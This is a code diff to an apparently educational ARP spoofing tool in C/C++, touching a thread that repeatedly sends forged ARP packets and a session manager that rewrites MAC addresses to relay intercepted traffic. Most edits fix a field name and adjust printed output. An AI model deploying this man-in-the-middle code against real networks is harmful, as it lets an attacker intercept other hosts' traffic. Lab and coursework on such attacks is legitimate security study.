@@ -69,9 +69,9 @@ void* Attack(void* info){
     while(1){ // 2 attacks per 1~6 random seconds (asynchronous attack)
         for(int i = 0; i < 2; i++){
             printf("\n----------_ARP (Session %d)_----------\n", PP->session_Number);
-            printf("[ sip : %s  ]\n", PP->sip);
+            printf("[ sip : %s ]\n", PP->sip);
             printf("[ smac : %s ]\n", PP->smac);
-            printf("[ tip : %s  ]\n", PP->tip);
+            printf("[ tip : %s ]\n", PP->tip);
             printf("[ tmac : %s ]\n\n", PP->tmac);
             if(pcap_sendpacket(PP->handle, reinterpret_cast<u_char*>(attack_packet), 42) != 0){
                 perror("{ send packet error }");
@@ -288,7 +288,7 @@ void Manage_Session(char** argv, char** smac, char** tmac, char* attack_mac, pca
                 TCP_header th;
                 UDP_header uh;
                 if(!strcmp(tmp2, "1")){
-                    printf("PING\n");
+                    printf("[ PING Packet ]\n");
                 }
                 else if(!strcmp(tmp2, "6")){
                     th.Print_TCP(packet);
@@ -305,15 +305,15 @@ void Manage_Session(char** argv, char** smac, char** tmac, char* attack_mac, pca
                 packet -= 34;
                 struct ARP_header* Ah = (struct ARP_header*)(packet);
                 // sender's mac -> attacker's mac
-                tomar_mac_addr(Ah->src_mac_addr, attack_mac);
+                //tomar_mac_addr(Ah->src_mac_addr, attack_mac);
                 tomar_mac_addr(Ah->sender_mac_addr, attack_mac);
 
                 // attacker's mac -> target's mac
-                tomar_mac_addr(Ah->Destination_mac_addr, tmac[i]);
-                tomar_mac_addr(Ah->target_ip_addr, tmac[i]);
+                //tomar_mac_addr(Ah->Destination_mac_addr, tmac[i]);
+                tomar_mac_addr(Ah->target_mac_addr, tmac[i]);
 
                 struct libnet_ethernet_hdr* eh = (struct libnet_ethernet_hdr*)(packet); // ether_dhost, ether_shost / u_int8_t
-                memcpy(eh->ether_dhost,  Ah->target_ip_addr, sizeof(Ah->target_ip_addr));
+                memcpy(eh->ether_dhost,  Ah->target_mac_addr, sizeof(Ah->target_mac_addr));
                 memcpy(eh->ether_shost, Ah->sender_mac_addr, sizeof(Ah->sender_mac_addr));
 
                 for(int i = 0; i < 2; i++){ // Send Relay Packet 2 times
@@ -324,6 +324,9 @@ void Manage_Session(char** argv, char** smac, char** tmac, char* attack_mac, pca
                 }
                 Ethernet_header eh1;
                 eh1.Print_Eth(packet);
+                printf("\n< Relayed Packet Info >\n");
+                ARP_header* aa = (struct ARP_header*)(packet);
+                Print_ARP(aa);
                 printf("[ Success to send Relay packet! ]\n");
                 count++;
             }
